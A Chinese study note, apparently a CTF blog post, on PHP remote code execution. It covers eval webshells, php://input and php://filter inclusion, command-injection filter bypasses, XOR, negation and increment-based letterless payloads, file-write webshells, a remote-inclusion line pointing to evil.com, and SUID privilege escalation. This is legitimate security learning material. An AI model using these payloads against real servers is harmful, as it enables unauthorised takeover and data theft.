---
title: RCE远程代码执行
date: 2026-06-13 00:00:00
categories:
  - Web安全
tags:
  - RCE
---
#  RCE

RCE（Remote Code Execution，远程代码执行）漏洞是指攻击者通过漏洞，能够在目标系统上**==远程执行任意代码==**的安全漏洞。这种漏洞通常允许攻击者在受害主机上执行恶意命令，可能导致系统被完全控制，甚至可能被用来**执行系统级操作**，如删除文件、窃取敏感数据、安装恶意软件等。



关于rce的php函数都写在了，php学习里面了。

## 命令执行函数

| 函数                                                         | 说明                                                         | 示例代码                                                     |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| [`system()`](https://www.php.net/manual/zh/function.system.php) | `system()` 函数用于在系统权限允许的情况下执行系统命令（Windows 和 Linux 系统均可执行）。 | `system('cat /etc/passwd');`                                 |
| [`exec()`](https://www.php.net/manual/zh/function.exec.php)  | `exec()` 函数可以执行系统命令，但不会直接输出结果，而是将结果保存到数组中。 | `exec('cat /etc/passwd', $result); print_r($result);`        |
| [`shell_exec()`](https://www.php.net/manual/zh/function.shell-exec.php) | `shell_exec()` 函数执行系统命令，但返回一个字符串类型的变量来存储系统命令的执行结果。 | `echo shell_exec('cat /etc/passwd');`                        |
| [`passthru()`](https://www.php.net/manual/zh/function.passthru.php) | `passthru()` 函数执行系统命令并将执行结果输出到页面中，支持二进制数据。 | `passthru('cat /etc/passwd');`                               |
| [`popen()`](https://www.php.net/manual/zh/function.popen.php) | `popen()` 函数执行系统命令，但返回一个资源类型的变量，需要配合 `fread()` 函数读取结果。 | `$result = popen('cat /etc/passwd', 'r'); echo fread($result, 100);` |
| [反引号 \`\`](https://www.php.net/manual/zh/language.operators.execution.php) | 反引号用于执行系统命令，返回一个字符串类型的变量来存储命令的执行结果。**注意：关闭了 [shell_exec()](https://www.php.net/manual/zh/function.shell-exec.php) 时反引号运算符是无效的** | `` echo `cat /etc/passwd` ``                                 |

源代码

~~~php
$code = $function . "(" . $content . ");";
eval($code);
~~~



### popen()

~~~php
popen(string $command, string $mode): resource|false
~~~

- **`$command`**：要执行的命令字符串（例如 `"ls -l"`）。
- **`$mode`**：管道模式，只能是 `'r'`（读取）或 `'w'`（写入）。



绕过payload

~~~php
content='cat /flag','r');$handle=popen('cat /flag','r');echo fread($handle,100);//
~~~



### fread

是 PHP 中用于**从已打开的文件指针中读取指定长度字节**的函数。

~~~php
fread(resource $handle, int $length): string|false
~~~

~~~php
$result = popen('cat /etc/passwd', 'r'); 
echo fread($result, 100);
~~~











## PHP流包装器

**流包装器**是 PHP 中提供的一种统一接口，允许开发者使用相同的函数（如 `fopen()`、`file_get_contents()`、`include` 等）来访问不同类型的资源，而不仅仅是本地文件系统。

![image-20260517201044731](RCE/image-20260517201044731.png)



## eval()执行

~~~php
<?php
if (isset($_REQUEST['cmd'])) {
    eval($_REQUEST["cmd"]);
} else {
    highlight_file(__FILE__);
}
?>
~~~

对于这种题，直接传`cmd =system('ls ');` 就可以找到flag



或者上传一个webshell

~~~url
http://<目标网址>/?cmd=fputs(fopen('muma.php','w'),'<?php @eval($_POST[a]);?>');
~~~

然后蚁剑连接即可

其中传`a=phpinfo();`  可以查看当前php环境的**配置信息**。



## 花括号

在 PHP 的**双引号字符串**（或 heredoc 语法）中，`{$bytes}` 这种写法叫做**复杂（花括号）语法**，用于明确表示**变量名或表达式的边界**。

花括号内可以是任意 **==PHP 表达式==**





## 文件包含

## include()

include（）括号里面的东西必须是**字符串**

后面跟**文件路径字符串**

实际上include不是函数，而是**==语言构造器==**，后面可以不加括号。（类似于echo）



包含的内容，**==php代码==**会直接执行，**==纯文本==**会直接显示出来。

`include($_GET["file"]);` 期望的参数是**==文件路径==**（或流标识符），而不是 PHP 代码本身。



文件包含发生在应用程序动态引入外部文件时，**未能对用户输入的文件名进行充分的==安全检查和过滤==**。攻击者可以利用它读取敏感文件（如配置文件、源代码）或在服务器上执行任意代码。



当开发者为了代码复用（如引入页头、页尾、配置文件），而将**==用户可控的变量==**（如 `$_GET['file']`）直接拼接到这些函数中时，就会产生文件包含安全风险。



根据包含的文件类型分为**两类**

![image-20260508190439301](Web安全/image-20260508190439301.png)





如果`allow_url_include=On` ，则可以包含远程URL执行任意代码

~~~php
include ('http://evil.com/shell.txt');   //必须带单引号
~~~

> 远程文件包含可用链接(<?php @eval($_POST['a']); ?>)：
> https://raw.githubusercontent.com/ProbiusOfficial/PHPinclude-labs/main/RFI
> https://gitee.com/Probius/PHPinclude-labs/raw/main/RFI



在PHP中，以下函数是导致文件包含的常见根源：

- `include()`

- `require()`

- `include_once()`

- `require_once()`

  区别

| 函数           | 失败时         | 可重复包含 | 典型使用场景         |
| :------------- | :------------- | :--------- | :------------------- |
| `include`      | 警告，继续     | 是         | 模板、非关键组件     |
| `require`      | 致命错误，终止 | 是         | 核心配置、必要函数库 |
| `include_once` | 警告，继续     | 否         | 函数库（防重复定义） |
| `require_once` | 致命错误，终止 | 否         | 类定义、关键依赖     |

使用方法都是类似的



## php://input伪协议

**`php://input`** 是 PHP 提供的一个只读（read-only）数据流包装器（stream wrapper）。它的核心功能是**允许你读取原始的 HTTP ==请求体（Request Body）数据==**。



数据源：它读取的是 “RAW POST DATA”，即最原始的、**未经任何解析**的 HTTP 请求体。

这与 **$POST 超全局数组**完全不同。$POST 仅能解析 `application/x-www-form-urlencoded `或 `multipart/form-data `类型的请求，并将其转换为**==关联数组==**。





~~~php
<?php
if (isset($_GET['file'])) {
    if ( substr($_GET["file"], 0, 6) === "php://" ) {
        include($_GET["file"]);
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
<hr>
i don't have shell, how to get flag? <br>
<a href="phpinfo.php">phpinfo</a>
~~~

这种可以构造url

~~~
http://challenge-3c30355f64bb72d6.sandbox.ctfhub.com:10800/?file=php://input
~~~

然后传递post参数传递`<?php system("ls")?>`  就可以进行RCE



## php://filter

`php://filter`是 PHP 提供的一种**元包装器**（meta-wrapper），它的核心功能**不是读写数据**，而是在数据流被`打开、读取或写入`时，像一个过滤器一样对流中的数据进行**==处理或转换==**。你可以把它想象成一个数据加工管道。原始数据从一端进入，经过一个或多个“过滤器”的处理，最终转换后的数据从另一端输出。



基本语法

~~~php
php://filter/read=<过滤器链>/resource=<目标文件>
~~~

- `read=`：指定应用于读取操作的过滤器链（可以省略 `read=`，直接写过滤器）。
- `<过滤器链>`：一个或多个过滤器名称，用竖线 `|` 连接，数据会依次经过这些过滤器处理。
- `/resource=`：指定要读取的目标资源（如服务器上的一个文件）。

只能读取**==本地的文件==**



常用的转换器类型：

**转换类**：
`convert.base64-encode`：将文件内容 Base64 编码
`convert.base64-decode`：Base64 解码（需配合编码使用）
**字符串处理类**：
`string.toupper`：转为大写
`string.rot13`：ROT13 加密
**压缩类**：
`zlib.deflate`：压缩数据
`zlib.inflate`：解压数据

~~~php
<?php
error_reporting(E_ALL);
if (isset($_GET['file'])) {
    if ( substr($_GET["file"], 0, 6) === "php://" ) {
        include($_GET["file"]);
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
<hr>
i don't have shell, how to get flag? <br>
flag in <code>/flag</code>
i don't have shell, how to get flag?
flag in /flag
~~~

这个可以构造url

~~~
http://challenge-3339ae4b80a8fe4c.sandbox.ctfhub.com:10800/?file=php://filter/resource=/flag
~~~

来查看flag



## 路径穿越

~~~
http://challenge-eb543f10e73658b3.sandbox.ctfhub.com:10800/?file=flag/../../../../etc/passwd
~~~



## 命令注入

命令执行指的是由于应用程序对**==用户输入过滤不严==**，攻击者可以通过提交恶意构造的参数破坏命令语句结构，从而让服务器 执行任意操作系统命令。



### 命令分隔符

| 符号 | 含义                                                   | Linux/Unix | Windows  |
| ---- | ------------------------------------------------------ | ---------- | -------- |
| ；   | 然后（顺序执行两个命令）                               | 可以使用   | 不能使用 |
| &&   | 成功了才                                               | 可以使用   | 可以使用 |
| \|\| | 失败了就                                               | 可以使用   | 可以使用 |
| \|   | 管道符（前一个命令的标准输出作为后一个命令的标准输入） | 可以使用   | 可以使用 |

`&`在url中最好写成`%26`的形式，因为&在url中有**特殊的意义**，url中会用`&`当做查询字符串的**参数分隔符**。

写成`%26`后就可以直接当成**普通的字符串**出入服务器了





### 绕过命令分隔符

#### %a

url编码的换行符（\n）   `%0a`   可以充当空格，也可以充当**命令分隔符**





![image-20260510162736279](Web安全/image-20260510162736279.png)

对于这道题可以构造payload

~~~
127.0.0.1 & ls
~~~

#### ?>

?>是php的结束标签，会**自动结束前面的语句**。不需要加分号。



### 字符串过滤

如果通过字符串过滤不让使用某些命令可采取以下几种方法

例如`cat`命令不能用时可以使用`tac`

#### 引号绕过

在Bash中，引号（单引号`'`、双引号`"`、反引号）的主要作用是**分组和解析控制**，而不是成为最终命令的一部分。Shell会在执行命令前先进行**引号去除（Quote Removal）** 处理。

`c"at"`、`c'at'`、`c""at`最终都会变成 `cat。`



#### shell特殊字符

- `$!` 代表上一个后台进程的 PID，如果没有后台任务，它为空，不影响结果。

- **`$@` 是特殊shell参数**：
  - `$@` 扩展为所有位置参数，但在这种上下文中没有参数时，它扩展为空
  - `ca$@t` → `ca` + `（空） `+ `t` = `cat`

就是执行一个文件时的添加的参数

```shell
for arg in "$@"; do
    echo "  [$arg]"
done
```

执行

~~~shell
./test.sh hello "world of shells" foo
~~~

输出结果

~~~shell
 [hello]
  [world of shells]
  [foo]

~~~







## 过滤空格

### ${IFS}

是**==shell变量==**

在Bash中**IFS**默认为**空格**、制表符、换行符

可以构造payload

~~~
127.0.0.1;cat${IFS}/etc/passwd
~~~

虽然`$IFS`也可以标记表示空格，但最好还是用`${IFS}`





因为有时候IFS会与后面字符的连在一起

~~~
$IFSffff$@llllaaaaggggg 
~~~

例如这时就会把`IFSfff`当成一个变量

使用`${IFS}`就不会这样



### 输入重定向<

~~~shell
cat<flag.txt
~~~

和cat flag.txt效果一样



### Tab键

`%09`是URL编码的TAB键，可以充当**==空格==**使用



## 过滤目录分隔符

### 路径转跳法

~~~
ping 127.0.0.1 & cd flag_is_here & cat flat.txt 
和ping 127.0.0.1 ; cd flag_is_here ; cat flat.txt 
~~~

第一个用&，每个命令会在**==各自的子shell==**中异步执行，所以不能查看`flag_is_here/flag.txt`

第二种方法是顺序执行，可以**正常查看**

### 八进制绕过法，和十六进制绕过法

**$(printf  "\57")**   

**$(printf  "\x2f")**

用他俩来代替`/`

- **`$( ... )`** 是 shell中的**命令替换**（command substitution）语法。
  它会执行括号内的命令，然后将其输出替换到当前位置。
- **`printf`** 是一个 **shell 内置命令**（bash 等）或外部程序（`/usr/bin/printf`），用于格式化输出。

## 过滤关键字

例如绕过`flag`

### 使用通配符

**使用通配符**：`f*` 或 `fla?`

- *（星号）：匹配任意长度（包括零）的任何字符。

- ?（问号）：匹配恰好一个任意字符。


示例：假设一个目录下有这些文件：`flag.txt, flag.php, logo.png`。

命令 `cat f*` 会被Shell扩展为 `cat flag.txt flag.php`

命令 `cat fl?g.txt` 会被扩展为 `cat flag.txt`

### 使用引号或转义

**使用引号或转义**：`cat fl''ag` 或 `cat fl\ag`，但黑名单过滤的是这些字符本身，即使用引号，字符串`fl''ag`里依然包含`ag`，可能会被正则匹配到`flag`这个词。此方法可能无效。



- 原理分析：

- 安全过滤层面：检查字符串`cat fl\ag.txt`。

- Shell执行层面：如果Payload成功通过了过滤，Shell会解析`cat fl\ag.txt`。Shell看到反斜杠`\`，它会将其解释为“**转义下一个字符**”，于是`\a`就被解释为**==普通的字母a==**。因此，整个参数最终被Shell理解为flag.txt。

- **原理分析**：
  - **安全过滤层面**：检查字符串`fl'ag'.txt`
  - **Shell执行层面**：如果Payload成功通过了过滤，Shell会解析`fl'ag'.txt`。Shell会将`fl`、`ag`和`.txt`拼接起来（引号内的内容被直接连接），最终参数就是`flag.txt`。



shell中**相邻**（没有空格）的字符串会直接**拼接在一起**

~~~php
echo 12''23
#输出结果是1223
~~~



## 注释

**#**

- **#是shell中的==注释符==**

- **在 PHP 代码里**（即 `<?php ... ?>` 内部），`#` 是**单行注释符**，功能和 `//` 一样。
- **如果 `#` 出现在字符串中**（例如 `"#"`），或者出现在 PHP 之外的纯文本/HTML 中，它就只是一个**==普通字符==**。
- **当 PHP 通过 `shell_exec()`、`system()` 等将字符串传给 shell 时**，`#` 的注释作用由 **shell** 解释，PHP 自己并不会把它当作注释（只是传递字符）。



## URL编码

**浏览器**进行URL 编码会将字符转换为可通过因特网传输的格式。

由于 URL 常常会包含 **ASCII 字符集外**的字符，URL 必须转换为有效的 ASCII 格式。

URL 编码使用 "%" 其后跟随两位的十六进制数来替换**非 ASCII 字符**。

到服务器后还是会转换成**==普通字符==**的。



除了特殊字符，一些有特殊意义的字符，如`&`（参数分隔符），`+`（url中表示空格）最好也url编码一下



url编码过程



url **get传递的参数**或post**请求体**类型为`application/x-www-form-urlencoded`时，对参数里的特殊字符进行**url编码** （其他的保持不变） -->  到服务器后会对整个参数进行url解码 -->  结果是ASCII里的字符正常显示，URL编码的字符恢复

~~~php
<?php
$a = urlencode("韩恺");
$b = urldecode("abc+$a");
var_dump($b);
~~~

~~~
string(10) "abc 韩恺"
~~~



对`+`进行URL解码会变成**空格**

一些特殊情况

![image-20260529175532898](RCE/image-20260529175532898.png)

# 无参REC

只能输入`A()`或`A(B(C()))`这种形式，即函数不能带参数，称为无参命令执行。

这种题目的做法基本上就是，利用超级全局变量来进行bypass，利用函数的嵌套的替代参数的出现。然后进行任意文件读取。

~~~
(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $code))
//(?R)表示整个正则表达式，[^\W]表示不是非单词字符 → 等价于 \w（字母、数字、下划线）
~~~



## array_rand()

这个会经常用到，作用是从数组中随机取出一个或多个单元

## array_flip()

交换数组中的键和值

## localeconv()

`current(localeconv());`配合可以代替符号`.`

## getallheaders()

apache环境下，可以使用这个获取http头

## get_defined_vars()

返回当前作用域中所有**已定义变量**的关联数组。

如果写在函数或方法内部，则默认只返回该函数**作用域内**的局部变量；



## getcwd()

获取当前目录

## scandir()

读取目录

## dirname()

跳到上一级目录

## chdir()

修改当前目录



## show_source()

对文件进行语法高亮显示



[相关博客](output/RCE.html)

# 环境变量注入

## foreach

用于**==遍历数组或对象==**

~~~php
$arr = ['a' => 1, 'b' => 2, 'c' => 3];

//遍历键值对
foreach ($arr as $key => $val) {
    echo "$key => $val\n";
}   

//遍历值
foreach ($arr as $val) {
    echo "$val";
}

// 按引用修改原数组
foreach ($arr as &$val) {
    $val *= 2;
}
unset($val); // 清除引用，避免后续意外修改
~~~

关于引用

~~~php
$a = 5;
$b = &$a;   // $b 成为 $a 的引用（别名）
$b = 10;    // 直接修改，不需要任何“解引用”符号
此时$a=10
~~~



## putenv

~~~php
putenv(string $assignment): bool
~~~

是 PHP 中用于**设置环境变量**的函数

**`$assignment`**：形式为 `"NAME=value"` 的字符串，其中 `NAME` 是变量名，`value` 是要设置的值。

示例

~~~php
putenv("DB_HOST=localhost");
putenv("DEBUG_MODE=1");

echo getenv("DB_HOST");   // 输出: localhost
echo getenv("DEBUG_MODE"); // 输出: 1
~~~





~~~
foreach($_REQUEST['envs'] as $key => $val) {
    putenv("{$key}={$val}");
}

~~~







# 文件写入导致的RCE

| 函数                | 说明                                                         | 示例代码                                                     |
| ------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| `file_put_contents` | 将字符串写入文件，如果文件不存在会尝试创建。适用于快速简单地写入数据到文件。 | `file_put_contents('example.php', '<?php eval($_GET[helloctf]); ?>');` |
| `fwrite/fputs`      | 向一个打开的文件流写入数据，适用于需要更细粒度的控制文件操作的场景。 | `$fp = fopen('example.php', 'w'); fwrite($fp, '<?php eval($_GET[helloctf]); ?>'); fclose($fp);` |
| `fprintf`           | 类似于 `fwrite`，但提供格式化功能，允许按照特定格式写入数据到文件流。适用于需要格式化写入的场景。 | `$fp = fopen('example.php', 'w'); fprintf($fp, '<?php eval($_GET[helloctf]); ?>'); fclose($fp);` |





## file_put_contents

~~~php
file_put_contents(
    string $filename,          // 文件路径
    mixed  $data,              // 要写入的数据（字符串、数组或资源）
): int|false
~~~

~~~

function helloctf($code){
    $code = "file_put_contents(".$code.");";
    eval($code);
}
~~~



这时候我们传入`?c='a.php','<?php @eval($_POST[s]); ?>'`

就会创建一个a.php，内容为`<?php @eval($_POST[s]); ?>`

然后就可以RCE了



## fopen

~~~php
fopen(string $filename, string $mode): resource|false
~~~

| 参数        | 说明                                                         |
| :---------- | :----------------------------------------------------------- |
| `$filename` | 文件路径（支持本地文件、协议如 `http://`、`ftp://`，或 PHP 包装器如 `php://input`） |
| `$mode`     | 打开模式                                                     |

w是**只写**，如果文件已存在将会**清空文件**

如果成功：返回**文件指针资源** (`resource`)

如果失败：返回false



## fwrite/fputs

fputs是fwrite的别名，两者的功能**完全一样**

~~~php
fwrite(resource $handle, string $data): int|false
~~~

| 参数      | 说明                                                         |
| :-------- | :----------------------------------------------------------- |
| `$handle` | 由 `fopen()` 或 `fsockopen()` 返回的文件系统指针（resource） |
| `$data`   | 要写入的字符串内容                                           |



## fprintf

~~~
fprintf(resource $handle, string $format, mixed ...$values): int|false
~~~

| 参数      | 说明                                         |
| :-------- | :------------------------------------------- |
| `$handle` | 由 `fopen()` 等返回的文件指针资源            |
| `$format` | 格式字符串（支持 `%s`、`%d`、`%f` 等占位符） |
| `$values` | 要格式化的变量（数量需与占位符匹配）         |

第二个参数可无

~~~php
fprintf($fp, '<?php eval($_GET[helloctf]); ?>');
~~~





# 取反绕过

## 动态调用

~~~
('函数名')(参数)
 //"字符串"(参数)
~~~

这是函数的**动态调用**；

eval不是函数，是**特殊语句**。不能动态调用。



例如将phpinfo取反后再url编码，再构造payload

~~~~
?code=(~%8F%97%8F%96%91%99%90)();
~~~~

url解码后的是取反过的，不可打印的字符，所以不会被检测到

HTTP GET ，和POST参数本质上都会以“**字符串**”形式进入 PHP。



# 无字母数字RCE

PHP5中，assert()是一个函数，我们可以用$_=assert;$_()这样的形式来执行代码。但在PHP7中，assert()变成了一个和eval()一样的**==语言结构==**，不再支持上面那种调用方法。



post参数进行url编码到服务器后也会解码

**参数分隔符**和get方法一样，也是`&`



~~~
if(preg_match("/[a-z0-9]/is", $code))
~~~



## 异或拼接字符串

选择非字母数字的字符，通过**异或成我们想要的字符**，再**拼接**成payload，就可以绕过检测

~~~
<?php
echo "5"^"Z";
?> //会输出o
~~~



~~~
code=$_=('%D9'^'%AA').('%D3'^'%AA').('%D9'^'%AA').('%DE'^'%AA').('%CF'^'%AA').('%C7'^'%AA');$__='_'.('%AD'^'%FD').('%AF'^'%E0').('%AE'^'%FD').('%AB'^'%FF');$___=$$__;$_($___['_']);&_=ls
相当于system($_POST['_']);
~~~





## 取反

~~~
$_ = ~"%9e%8c%8c%9a%8d%8b"; $__ = ~"%a0%af%b0%ac%ab";$___ = $$__;$_($___[_]);
~~~

~~~
code=$_=~"%8C%86%8C%8B%9A%92";$__=~"%A0%AF%B0%AC%AB";$___=$$__;$_($___['_']);&_=ls //相当于system($_POST['_']);
~~~



## 汉字取反

对于一个汉字进行`~($x{0})`或`~($x{1})`或`~($x{2})`的操作，可以得到某个`字节数的`的字符值，我们就可以利用这一点构造出`webshell`

~~~
<?php
$_="卢";
print(~($_{1}));
print(~"\x8d"); //对“卢”的utf—8编码下的第2个字节，再取反，得到r
~~~





~~~
$_++;$__="区";$___=~($__{$_});$__="冰";$___.=~($__{$_});$__="医";$___.=~($__{$_});$__="勺";$___.=~($__{$_});$__="皮";$___.=~($__{$_});$__="和";$___.=~($__{$_});$____='_';$__="寸";$____.=~($__{$_});$__="小";$____.=~($__{$_});$__="欠";$____.=~($__{$_});$__="立";$____.=~($__{$_});$___(${$____}[_]);//相当于system($_POST[_]);
~~~

汉字属于非ascii字符，记得url编码

其实burp会自动对汉字url编码，

在url中，`+`表示空格（`+`url解码后是空格），如果直接传入`+`,导致payload失效





## 自增

在处理字符变量的算数运算时，`PHP`沿袭了`Perl`的习惯，而不是C语言的。在C语言中，它递增的是`ASCII值,a = 'Z'; a++;` 将把 `a` 变成 `'['`（`'Z'` 的 ASCII 值是 90，`'['` 的 ASCII 值是 91），而在Perl中， `$a = 'Z'; $a++;` 将把 `$a` 变成`'AA'`。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增或递减其他字符变量则无效，原字符串没有变化。

![image-20260529170032211](RCE/image-20260529170032211.png)



数组->字符串：
在PHP中，**非字符串**是不能使用 . 符号进行拼接的，当你强制拼接时 **PHP 会将非字符串转换为字符串**：
$_ = 1; var_dump($_); var_dump($_.'');
这将会输出：int(1) string(1) "1"
但如果 $_ 是一个数组，则会被强制转换为**==字符串 Array==** 而无视数组内容。
所以 [].'' 表示在空数组后面拼接空字符串，PHP会优先转换类型，从而将**数组转换为字符串 Array**。



字符串本质上是一个**字符的有序序列**，同C语言类似，你可以直接通过**索引**（或者说**下标**）的方式直接访问字符串中的字符

~~~php
$a="hello"
var_dump($a[2]);
//会输出l
~~~





~~~php
$_=[].'';$___=$_[$__];$__=$___;$_=$___;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__++;$__++;$__++;$__++;$____.=$__;$__++;$____.=$__;$___($$____[_]); //相当于system($_POST[_])
~~~







[相关博客1](output/无字母数字RCE(1).html)

[相关博客2](output/无字母数字RCE(2).html)

# SUID提权

~~~shell
find / -perm -u=s -type f 2>/dev/null
~~~

是一个非常经典的**查找 SUID 文件**的命令

`-perm -u=s` 表示“匹配所有设置了 `u+s` 权限位的文件



## /bin/date

~~~shell
/bin/date -f /ffll444aaggg > dateflag.txt 2>&1
~~~

用/bin/date代替root读取文件

`-f` 表示把ffll444aaggg当成”日期文件来读“

`2>&1` 表示把报错输出也并到同一个文件里
